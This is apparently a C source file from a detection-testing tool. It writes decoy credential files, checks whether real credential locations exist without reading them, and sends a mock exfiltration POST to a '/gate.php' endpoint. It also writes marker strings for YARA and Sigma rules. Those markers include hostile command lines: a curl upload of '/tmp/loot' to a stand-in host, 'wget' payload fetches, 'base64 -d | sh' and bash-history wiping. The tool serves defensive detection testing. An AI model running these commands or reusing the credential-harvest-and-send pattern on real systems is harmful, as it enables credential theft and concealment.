// SPDX-License-Identifier: GPL-3.0-only
// Copyright (c) 2026 MikiMiku (MoreMorePwn)
//
// credential-access.c — credential-shaped reads and detection-rule markers.
//
// cred-read never touches a real secret: the files it opens and reads are
// decoys written into the work directory. The standard credential locations
// are only access()ed and stat()ed, and the result says present or absent, so
// the syscall view gets the shape without the host's secrets leaving the guest.
//
// rule-markers carries the strings YARA and Sigma rules key on, writes them to a
// file for file scans, and runs a few benign discovery commands so Sigma has
// process_creation events to match.
#include "samples.h"

#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

static uint32_t fnv1a(const unsigned char *data, size_t length)
{
    uint32_t hash = 2166136261u;
    for (size_t i = 0; i < length; i++) {
        hash ^= data[i];
        hash *= 16777619u;
    }
    return hash;
}

static ssize_t read_file(const char *path, unsigned char *buffer, size_t cap)
{
    int fd = open(path, O_RDONLY | O_CLOEXEC);
    if (fd < 0)
        return -1;
    ssize_t got = read(fd, buffer, cap);
    close(fd);
    return got;
}

static int write_fd(int fd, const char *text)
{
    size_t length = strlen(text);
    const char *cursor = text;
    while (length > 0) {
        ssize_t written = write(fd, cursor, length);
        if (written <= 0)
            return -1;
        cursor += written;
        length -= (size_t)written;
    }
    return 0;
}

static int write_text(const char *path, const char *text)
{
    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC | O_NOFOLLOW | O_CLOEXEC, 0600);
    if (fd < 0)
        return -1;
    int result = write_fd(fd, text);
    if (close(fd) != 0)
        result = -1;
    return result;
}

// Creates the parent directories of path, then the file.
static int write_nested(const char *path, const char *text)
{
    char copy[512];
    int length = snprintf(copy, sizeof copy, "%s", path);
    if (length <= 0 || (size_t)length >= sizeof copy)
        return -1;
    char *slash = strrchr(copy, '/');
    if (!slash)
        return -1;
    *slash = 0;
    if (sample_mkdir_p(copy) != 0)
        return -1;
    return write_text(path, text);
}

// Like write_nested but refuses to replace an existing file. *created is 0
// when the file was already there, so the caller can leave it alone.
static int write_nested_exclusive(const char *path, const char *text, int *created)
{
    char copy[512];
    int length = snprintf(copy, sizeof copy, "%s", path);
    if (length <= 0 || (size_t)length >= sizeof copy)
        return -1;
    char *slash = strrchr(copy, '/');
    if (!slash)
        return -1;
    *slash = 0;
    if (sample_mkdir_p(copy) != 0)
        return -1;
    int fd = open(path, O_WRONLY | O_CREAT | O_EXCL | O_CLOEXEC, 0600);
    if (fd < 0) {
        if (errno == EEXIST) {
            *created = 0;
            return 0;
        }
        return -1;
    }
    *created = 1;
    int result = write_fd(fd, text);
    if (close(fd) != 0)
        result = -1;
    if (result != 0)
        unlink(path);
    return result;
}

// Removes directories above path until stop, but only while they are empty.
// Existing directories with real content stop the walk, so nothing is lost.
static void remove_empty_parents(const char *path, const char *stop)
{
    char copy[512];
    int length = snprintf(copy, sizeof copy, "%s", path);
    if (length <= 0 || (size_t)length >= sizeof copy)
        return;
    char *slash = strrchr(copy, '/');
    if (!slash)
        return;
    *slash = 0;
    size_t stop_length = strlen(stop);
    while (strlen(copy) > stop_length && strncmp(copy, stop, stop_length) == 0 &&
           copy[stop_length] == '/') {
        if (rmdir(copy) != 0)
            break;
        slash = strrchr(copy, '/');
        if (!slash)
            break;
        *slash = 0;
    }
}

// Contents are obvious decoys: the AWS pair is the public documentation
// example and every other value contains ANTINOMIE-DEMO.
static const struct {
    const char *relative;
    const char *text;
} decoys[] = {
    {".aws/credentials",
     "[default]\n"
     "aws_access_key_id = AKIAIOSFODNN7EXAMPLE\n"
     "aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n"},
    {".ssh/id_rsa",
     "-----BEGIN OPENSSH PRIVATE KEY-----\n"
     "ANTINOMIE-DEMO-0000000000000000000000000000000000000000000000000000\n"
     "-----END OPENSSH PRIVATE KEY-----\n"},
    {".git-credentials",
     "https://demo:ghp_ANTINOMIEDEMO0000000000000000000000@github.com\n"},
    {".config/google-chrome/Default/Login Data",
     "SQLite format 3\n"
     "ANTINOMIE-DEMO-COOKIE-DB\n"
     "https://example.invalid\0demo\0hunter2-demo\n"},
    {".mozilla/firefox/demo.default/logins.json",
     "{\"logins\":[{\"hostname\":\"https://example.invalid\",\"username\":\"demo\","
     "\"password\":\"ANTINOMIE-DEMO\"}]}\n"},
    {".bash_history",
     "curl -s -X POST http://198.51.100.23/gate.php -d @/tmp/loot\n"
     "crontab -l\n"
     "history -c\n"},
};

SCENARIO(cred_read)
{
    const char *name = "cred-read";
    const char *home = getenv("HOME");
    int use_home = options->cred_home;
    if (use_home && (!home || !*home)) {
        sample_fail(name, "--cred-home needs HOME to be set");
        return 1;
    }

    // Probe the standard locations first, before any decoy is written, so
    // "present" reflects the guest's real state. Contents are never read.
    static const char *real_paths[] = {".aws/credentials",         ".ssh/id_rsa",
                                       ".git-credentials",         ".bash_history",
                                       ".config/google-chrome/Default/Login Data",
                                       ".mozilla/firefox",         ".bitcoin/wallet.dat"};
    int present = 0;
    if (home && *home) {
        for (size_t i = 0; i < sizeof real_paths / sizeof real_paths[0]; i++) {
            char path[600];
            snprintf(path, sizeof path, "%s/%s", home, real_paths[i]);
            struct stat info;
            if (stat(path, &info) == 0) {
                present++;
                sample_note(name, "real %s present (%lld bytes, not read)", real_paths[i],
                         (long long)info.st_size);
            }
        }
    }
    struct stat shadow;
    if (stat("/etc/shadow", &shadow) == 0)
        sample_note(name, "real /etc/shadow present (%lld bytes, not read)",
                 (long long)shadow.st_size);

    char base[512];
    if (use_home)
        snprintf(base, sizeof base, "%s", home);
    else
        snprintf(base, sizeof base, "%s/cred-home", options->workdir);

    char created_paths[8][600];
    size_t created_count = 0;
    size_t total = 0;
    uint32_t hash = 2166136261u;
    int read_ok = 0;
    for (size_t i = 0; i < sizeof decoys / sizeof decoys[0]; i++) {
        char path[600];
        snprintf(path, sizeof path, "%s/%s", base, decoys[i].relative);
        int created = 1;
        int written = use_home ? write_nested_exclusive(path, decoys[i].text, &created)
                               : write_nested(path, decoys[i].text);
        if (written != 0) {
            sample_note(name, "could not write decoy %s: %s", decoys[i].relative, strerror(errno));
            continue;
        }
        if (!created) {
            sample_note(name, "%s already exists; left untouched", decoys[i].relative);
            continue;
        }
        if (use_home && created_count < sizeof created_paths / sizeof created_paths[0])
            snprintf(created_paths[created_count++], sizeof created_paths[0], "%s", path);
        unsigned char buffer[4096];
        ssize_t got = read_file(path, buffer, sizeof buffer);
        if (got < 0) {
            sample_note(name, "could not read back %s: %s", decoys[i].relative, strerror(errno));
            continue;
        }
        total += (size_t)got;
        uint32_t file_hash = fnv1a(buffer, (size_t)got);
        hash ^= file_hash;
        hash *= 16777619u;
        read_ok++;
        sample_note(name, "read %s (%zd bytes, %08x)", decoys[i].relative, got, file_hash);
    }

    char body[256];
    int length = snprintf(body, sizeof body, "stage=creds&files=%d&bytes=%zu&hash=%08x", read_ok,
                          total, hash);
    unsigned long long received = 0;
    const char *host = sample_host(options);
    int port = sample_port(options, SAMPLE_HTTP_PORT);
    int delivered =
        sample_http_request(host, port, "POST", "/gate.php", body, (size_t)length, &received) == 0;
    if (!delivered)
        sample_note(name, "%s:%d unreachable: %s", host, port, strerror(errno));
    sample_pass(name, "%d/%zu decoy credential files read from %s, %zu bytes, exfil POST %s to %s:%d",
             read_ok, sizeof decoys / sizeof decoys[0], use_home ? "$HOME" : base, total,
             delivered ? "sent" : "attempted", host, port);
    sample_note(name, "%d/7 standard credential paths present; only stat'ed, never read", present);
    if (use_home) {
        // Always remove what this run created, even with --keep: --keep is for
        // the work directory, not for planting files in a real home.
        for (size_t i = 0; i < created_count; i++)
            unlink(created_paths[i]);
        for (size_t i = 0; i < created_count; i++)
            remove_empty_parents(created_paths[i], home);
        sample_note(name, "removed %zu decoy files from $HOME", created_count);
    }
    return 0;
}

static const char *markers[] = {
    "ANTINOMIE_BEHAVIOR_SAMPLE_v2",
    "ANTINOMIE_CRED_DECOY",
    "T1059.004",  "T1105",     "T1055",     "T1071.001", "T1048.003",
    "T1552.001",  "T1053.003", "T1547.001", "T1620",     "T1014",
    "attack.execution", "attack.persistence", "attack.defense-evasion",
    "attack.credential-access", "attack.command-and-control", "attack.exfiltration",
    "attack.discovery", "attack.privilege-escalation",
    "curl -s -X POST http://198.51.100.23/gate.php -d @/tmp/loot",
    "wget -qO- http://198.51.100.23/download.bin",
    "base64 -d | sh",
    "chmod 777 /tmp/.x",
    "LD_PRELOAD=/tmp/libx.so",
    "memfd_create",
    "ptrace(PTRACE_TRACEME)",
    "/dev/shm/.cache",
    "crontab -l",
    "systemctl --user enable antinomie-demo",
    "history -c",
    "rm -rf ~/.bash_history",
};

static int run_command(const char *program, char *const argv[])
{
    pid_t child = fork();
    if (child == 0) {
        execvp(program, argv);
        _exit(127);
    }
    if (child < 0)
        return -1;
    int status = 0;
    if (waitpid(child, &status, 0) != child)
        return -1;
    return WIFEXITED(status) ? WEXITSTATUS(status) : -1;
}

SCENARIO(rule_markers)
{
    const char *name = "rule-markers";
    size_t count = sizeof markers / sizeof markers[0];
    char text[4096];
    size_t at = 0;
    for (size_t i = 0; i < count && at + 64 < sizeof text; i++) {
        int written = snprintf(text + at, sizeof text - at, "%s\n", markers[i]);
        if (written < 0)
            break;
        at += (size_t)written;
        if (i < 4)
            sample_note(name, "marker %s", markers[i]);
    }
    char path[600];
    snprintf(path, sizeof path, "%s/rule-markers.txt", options->workdir);
    int written = write_text(path, text) == 0;

    // Benign discovery commands: Sigma's Linux rules match process_creation
    // events for these argument vectors. Each runs without a shell.
    static const struct {
        const char *program;
        char *const argv[4];
    } commands[] = {
        {"uname", {(char *)"uname", (char *)"-a", NULL}},
        {"id", {(char *)"id", NULL}},
        {"crontab", {(char *)"crontab", (char *)"-l", NULL}},
        {"cat", {(char *)"cat", (char *)"/etc/os-release", NULL}},
    };
    int ran = 0;
    for (size_t i = 0; i < sizeof commands / sizeof commands[0]; i++) {
        int status = run_command(commands[i].program, commands[i].argv);
        if (status >= 0)
            ran++;
    }
    sample_pass(name, "%zu markers in %s (%s), %d/%zu discovery commands executed", count, path,
             written ? "written" : "not written", ran, sizeof commands / sizeof commands[0]);
    sample_note(name, "markers name MITRE techniques and Sigma tags for rule and static scans");
    return 0;
}
